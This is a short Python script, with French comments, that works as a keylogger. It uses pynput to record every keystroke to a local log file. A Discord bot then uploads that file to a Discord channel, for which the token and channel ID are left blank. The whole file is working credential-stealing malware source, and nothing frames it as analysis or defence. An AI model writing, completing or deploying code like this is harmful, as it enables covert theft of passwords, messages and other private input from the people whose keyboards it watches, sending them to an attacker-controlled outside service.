
import discord
from pynput import keyboard

TOKEN = ''
CHANNEL_ID = 

intents = discord.Intents.default()
intents.typing = False
intents.presences = False

client = discord.Client(intents=intents)

def send_file_to_discord():
    channel = client.get_channel(CHANNEL_ID)
    print(channel)  # Ajout d'une instruction pour vérifier le canal
    with open("log.txt", "rb") as file:
        file_data = discord.File(file)
        return channel.send(file=file_data)

@client.event
async def on_ready():
    print('Connecté à Discord en tant que {0.user}'.format(client))
    await send_file_to_discord()

def on_press(key):
    try:
        with open("log.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            with open("log.txt", "a") as f:
                f.write(" ")
        else:
            with open("log.txt", "a") as f:
                f.write("[" + str(key) + "]")

keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

client.run(TOKEN)
